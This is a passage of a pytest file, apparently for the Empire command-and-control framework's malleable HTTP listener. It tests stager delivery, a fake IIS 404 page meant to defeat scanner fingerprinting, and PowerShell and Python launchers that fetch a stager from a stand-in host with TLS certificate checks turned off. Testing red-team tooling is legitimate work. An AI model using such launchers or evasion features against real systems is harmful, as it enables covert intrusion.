    listener.serialized_profile = profile._serialize()

    client = _drive_handle_request_setup(listener, monkeypatch)
    caplog.set_level(logging.WARNING, logger="empire.server.listeners.http_malleable")

    get_response = client.get("/init/")
    assert get_response.status_code == status.HTTP_404_NOT_FOUND
    assert "404 - File or directory not found." in get_response.get_data(as_text=True)

    post_response = client.post("/init/", data=b"some-routing-packet")
    assert post_response.status_code == status.HTTP_404_NOT_FOUND
    assert "404 - File or directory not found." in post_response.get_data(as_text=True)

    # The gate emits a WARNING with this specific phrase. Asserting on it
    # locks the test to the gate itself, not to whichever 404 branch
    # happens to be reachable — a refactor that moves the gate past the
    # agentInfo extraction would lose the WARNING here even if the response
    # body still happened to be 404 from a different branch.
    expected_gate_warnings = 2  # one per request (GET + POST)
    gate_warnings = [
        r for r in caplog.records if "refusing stager URI" in r.getMessage()
    ]
    assert len(gate_warnings) == expected_gate_warnings, (
        f"expected one gate WARNING per request, got {len(gate_warnings)}: "
        f"{[r.getMessage() for r in gate_warnings]}"
    )


def test_stager_uri_returns_csharp_binary_bytes_on_stage0(
    monkeypatch, main_menu_mock, tmp_path
):
    """End-to-end Flask test_client coverage for the actual bug this PR
    fixes: a request hitting the malleable listener's stager URI with a
    STAGE0-shaped routing packet for csharp must receive the
    SharpireMalleable binary bytes in the response body — not "" (the
    pre-fix behavior) and not a 404.

    The unit-level generate_stager() tests catch a revert to `return ""`,
    but they do NOT catch a regression where Flask dispatch short-circuits
    before reaching generate_stager. This test locks in the full path:
    handle_request → agentcommsv2.handle_agent_data → STAGE0 branch →
    generate_stager(csharp) → generate_launcher → compile → read_bytes →
    Response body.
    """
    from fastapi import status

    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"

    fake_bin = tmp_path / "sharpire-malleable.exe"
    expected_bytes = b"MZ" + b"\x00" * 32 + b"SMOKE-MARKER"
    fake_bin.write_bytes(expected_bytes)
    main_menu_mock.dotnet_compiler.compile_stager = MagicMock(
        return_value=str(fake_bin)
    )

    # Drive the listener's handle_request closure to call generate_stager
    # by short-circuiting the routing-packet decode: handle_agent_data
    # returns a STAGE0 result for csharp, the listener then dispatches
    # to generate_stager(csharp) which is what we want to exercise.
    main_menu_mock.agentcommsv2.handle_agent_data = MagicMock(
        return_value=[("csharp", b"STAGE0", "None")]
    )
    main_menu_mock.obfuscationv2.get_obfuscation_config = MagicMock(return_value=None)

    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    client = _drive_handle_request_setup(listener, monkeypatch)

    # POST to the stager URI with a non-empty cookie so the malleable
    # transaction's extract_client returns truthy agentInfo. The cookie
    # contents don't matter — handle_agent_data is mocked.
    response = client.post(
        "/init/",
        data=b"agent-info-payload",
        headers={"Cookie": "session=cm91dGluZyBwYWNrZXQ="},
    )

    assert response.status_code == status.HTTP_200_OK, (
        f"expected 200 with binary body, got {response.status_code}: "
        f"{response.get_data()[:200]!r}"
    )
    assert b"SMOKE-MARKER" in response.get_data(), (
        "stage 0 must return the SharpireMalleable binary bytes — pre-fix "
        f"this would have been empty; got body of length "
        f"{len(response.get_data())}: {response.get_data()[:200]!r}"
    )


def test_host_stage_true_does_not_fire_gate(monkeypatch, main_menu_mock, caplog):
    """With the default profile (host_stage implicitly True), hitting the
    stager URI must NOT trigger the host_stage WARNING. We don't assert on
    the response body because downstream stager generation depends on a
    real MainMenu wiring that isn't present in this test; we just verify
    the gate's negative path."""
    import contextlib
    import logging

    from empire.server.common import malleable

    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    # Fixture precondition: the amazon profile doesn't set host_stage, so
    # it should default to True. If this assert ever fires, the parser
    # default has drifted and the rest of the test is meaningless.
    profile = malleable.Profile._deserialize(listener.serialized_profile)
    assert profile.host_stage is True

    client = _drive_handle_request_setup(listener, monkeypatch)
    caplog.set_level(logging.WARNING, logger="empire.server.listeners.http_malleable")

    # We don't care whether the response is a 200 stager, a 404 from a
    # different branch, or a 500 from the mocked MainMenu — only that the
    # host_stage gate did not fire.
    with contextlib.suppress(Exception):
        client.get("/init/")

    gate_warnings = [
        r for r in caplog.records if "refusing stager URI" in r.getMessage()
    ]
    assert gate_warnings == [], (
        f"host_stage gate fired unexpectedly: {[r.getMessage() for r in gate_warnings]}"
    )


def test_unknown_uri_returns_iis_404_not_500_crash(monkeypatch, main_menu_mock, caplog):
    """A request whose URI matches none of the profile's configured http-get,
    http-post, or http-stager URIs must return the IIS 7.5 404 page, NOT a
    Flask 500 from an AttributeError.

    Pre-fix, ``handle_request`` logged the ``unknown uri`` WARNING and then
    fell through to ``implementation.extract_client(...)`` with
    ``implementation = None``, raising ``AttributeError`` and surfacing a
    Flask 500 to the wire. That leaks an Empire fingerprint (the Flask
    debug-style 500 body) for any non-blocked scanner probing arbitrary
    paths — defeating the shared IIS-7.5 404 fingerprint that
    ``block_useragents`` and ``host_stage`` rely on.
    """
    import logging

    from fastapi import status

    main_menu_mock.install_path = Path(__file__).resolve().parents[1] / "server"
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)

    client = _drive_handle_request_setup(listener, monkeypatch)
    caplog.set_level(logging.WARNING, logger="empire.server.listeners.http_malleable")

    # `/` does not match the amazon profile's http-get/http-post/http-stager
    # URIs. Use a benign Mozilla UA so the block_useragents fast-path does
    # NOT short-circuit — we need the request to reach the URI dispatch.
    response = client.get(
        "/",
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    )

    assert response.status_code == status.HTTP_404_NOT_FOUND, (
        f"unknown URI must produce a clean 404, got {response.status_code}"
    )
    body = response.get_data(as_text=True)
    assert "404 - File or directory not found." in body, (
        "unknown URI must return the shared IIS-7.5 404 page so the "
        f"listener fingerprint stays uniform; got: {body[:200]!r}"
    )

    # The dispatcher's "unknown uri" WARNING must still fire — locks the
    # regression to this specific branch, not just to any 404-shaped response.
    unknown_uri_warnings = [
        r for r in caplog.records if "unknown uri" in r.getMessage()
    ]
    assert unknown_uri_warnings, (
        "expected an 'unknown uri' WARNING from the dispatcher, saw: "
        f"{[r.getMessage() for r in caplog.records]}"
    )


def _decode_ser(launcher: str) -> str:
    """Decode the obfuscated $ser literal a PowerShell launcher embeds."""
    match = re.search(
        r"\$ser=\$\(\[Text\.Encoding\]::Unicode\.GetString\(\[Convert\]::FromBase64String\('([A-Za-z0-9+/=]+)'\)\)\)",
        launcher,
    )
    assert match, "no $ser literal in launcher"
    return base64.b64decode(match.group(1)).decode("utf-16-le")


def _proxied_listener(monkeypatch, main_menu_mock):
    """Reverse proxy on 8443 in front of a listener bound on 80, with a Host
    option carrying no scheme so only host_address knows about TLS."""
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    listener.options["Host"]["Value"] = "proxy.example.com"
    listener.options["Port"]["Value"] = "80"
    listener.host_address = "https://proxy.example.com:8443/"
    return listener


def test_http_malleable_powershell_launcher_uses_advertised_address(
    monkeypatch, main_menu_mock
):
    """The launcher must call the advertised address, and the scheme-less
    Host option must not stop the TLS bypass from being emitted."""
    listener = _proxied_listener(monkeypatch, main_menu_mock)

    launcher = listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert _decode_ser(launcher) == "https://proxy.example.com:8443"
    assert "$t='/init/';" in launcher
    assert "ServerCertificateValidationCallback = {$true}" in launcher


def test_http_malleable_python_launcher_uses_advertised_address(
    monkeypatch, main_menu_mock
):
    listener = _proxied_listener(monkeypatch, main_menu_mock)

    launcher = listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )

    assert "server='https://proxy.example.com:8443/'\n" in launcher
    assert "req=vreq(server+'init/', )\n" in launcher
    assert (
        "ssl._create_default_https_context = ssl._create_unverified_context" in launcher
    )
    assert "proxy.example.com:80" not in launcher


def test_http_malleable_launchers_keep_stager_query_string(monkeypatch, main_menu_mock):
    """quantloader/jasperloader style stager blocks carry `parameter`
    directives; the '?' between path and query must survive."""
    listener = _build_malleable_listener(
        monkeypatch,
        main_menu_mock,
        profile_text=_profile_with_stager_block(
            """
            http-stager {
                set uri "/q2/Index.php";
                client {
                    parameter "id" "1";
                }
            }
            """
        ),
    )

    python_launcher = listener.generate_launcher(
        listener_name="fake_listener", language="python", encode=False
    )
    powershell_launcher = listener.generate_launcher(
        listener_name="fake_listener", language="powershell", encode=False
    )

    assert "req=vreq(server+'q2/Index.php?id=1', )\n" in python_launcher
    assert "$t='/q2/Index.php?id=1';" in powershell_launcher


def test_http_malleable_generate_launcher_raises_when_host_address_unset(
    monkeypatch, main_menu_mock
):
    listener = _build_malleable_listener(monkeypatch, main_menu_mock)
    listener.host_address = None

    with pytest.raises(RuntimeError, match="host_address"):
        listener.generate_launcher(
            listener_name="fake_listener", language="powershell", encode=False
        )
